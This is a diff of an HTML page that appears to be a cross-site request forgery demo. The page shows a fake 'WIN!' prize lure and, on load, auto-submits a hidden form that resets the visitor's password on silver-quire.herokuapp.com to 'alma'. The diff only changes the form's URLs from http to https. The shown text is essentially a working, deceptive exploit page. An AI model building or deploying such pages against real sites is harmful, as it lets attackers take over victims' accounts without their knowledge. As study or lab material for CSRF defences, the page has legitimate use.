@@ -15,14 +15,14 @@
         <p class="lead">You have a chance to win something. All you have to do is click the WIN! button below!</p>
         <p class="text-center"><a class="btn btn-lg btn-success" href="#" role="button">WIN!</a></p>
       </div>
-      <form id="pwreset" action="http://silver-quire.herokuapp.com/change-password" >
+      <form id="pwreset" action="https://silver-quire.herokuapp.com/change-password" >
           <input type="hidden" name="user[password]" value="alma" />
           <input type="hidden" name="user[password_confirmation]" value="alma" />
       </form>
       <script>
         $( document ).ready(function() {
             $( "#pwreset" ).submit();
-            //$( "#pwreset" ).ajaxSubmit({url: 'http://silver-quire.herokuapp.com/change-password', type: 'post'})
+            //$( "#pwreset" ).ajaxSubmit({url: 'https://silver-quire.herokuapp.com/change-password', type: 'post'})
          });
       </script>
   </body>
